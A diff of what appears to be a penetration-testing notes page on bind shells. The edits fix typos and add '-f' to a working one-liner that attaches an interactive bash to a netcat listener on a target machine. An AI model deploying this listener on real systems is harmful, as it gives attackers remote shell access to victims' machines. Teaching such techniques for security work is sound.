@@ -14,17 +14,17 @@ layout:
 
 # Bind shell
 
-A **Bind Shell** is a technique used to gain remote access to a victim's system by making it listen on a port and then connect to that listener. The shell sent to listen is attached to the target's shell on the target system letting us take control of the internal shell by connecting to it.
+A **Bind Shell** is a technique used to gain remote access to a victim's system by making it listen on a port and then connect to that listener. The shell sent to listen is attached to the target's shell on the target system, letting us take control of the internal shell by connecting to it.
 
 ## <mark style="color:orange;">Basic script</mark>
 
-* &#x20;Use and script that establishes a listening port on the target machine
+* &#x20;Use a script that establishes a listening port on the target machine
 
 {% code title="BindShell.sh" overflow="wrap" lineNumbers="true" %}
 ```bash
 #!/bin/bash
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $port >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $port >/tmp/f
 ```
 {% endcode %}
 
